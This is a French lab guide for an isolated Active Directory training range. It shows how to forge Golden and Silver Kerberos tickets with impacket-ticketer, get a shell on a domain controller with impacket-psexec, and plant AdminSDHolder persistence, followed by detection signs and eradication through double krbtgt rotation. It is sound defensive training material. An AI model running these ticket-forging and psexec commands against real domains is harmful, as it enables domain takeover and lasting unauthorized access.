# Build — Persistance (lab isolé GOAD-X) et éradication

> ⚠️ Lab isolé uniquement. Objectif pédagogique : poser une persistance, la **détecter**, puis
> l'**éradiquer** proprement (la vraie compétence).

## Pré-requis
- krbtgt (via DCSync, module 56) pour le Golden Ticket ; un hash de service pour le Silver.

## Étape 1 — Golden Ticket
```bash
# Avec le hash krbtgt + le SID du domaine
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <S-1-5-21-...> -domain corp.meridian.com Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.meridian.com      # accès via TGT forgé
```

## Étape 2 — Silver Ticket (plus ciblé)
```bash
# Avec le hash du compte machine/service de la cible (ex. CIFS d'un serveur)
impacket-ticketer -nthash <service_hash> -domain-sid <SID> -domain corp.meridian.com \
  -spn cifs/target.corp.meridian.com Administrator
```

## Étape 3 — AdminSDHolder (persistance par ACL)
```powershell
# Ajouter une ACE pour un compte contrôlé sur AdminSDHolder -> SDProp la propage aux groupes protégés
# (démontrer puis retirer en lab)
```

## Étape 4 — Détecter (passer côté bleu)
Observer les signes : TGT à durée anormale, 4769 pour des SPN avec tickets forgés, modif AdminSDHolder
(5136), sIDHistory inattendu.

## Étape 5 — Éradiquer (la vraie compétence)
```powershell
# Rotation krbtgt x2 (script Microsoft New-KrbtgtKeys.ps1), avec délai de réplication entre les deux
# Révoquer les certificats suspects ; nettoyer AdminSDHolder/sIDHistory/KeyCredentialLink
```

## Vérification
- Golden/Silver fonctionnels AVANT éradication ; APRÈS rotation krbtgt x2, les Golden Tickets forgés
  ne fonctionnent plus.

## Pièges courants
- Rotation krbtgt **une seule fois** (insuffisant) ; oublier le délai de réplication entre les deux.
- Nettoyer les symptômes sans traiter la cause (certs, ACL) → retour de l'attaquant.
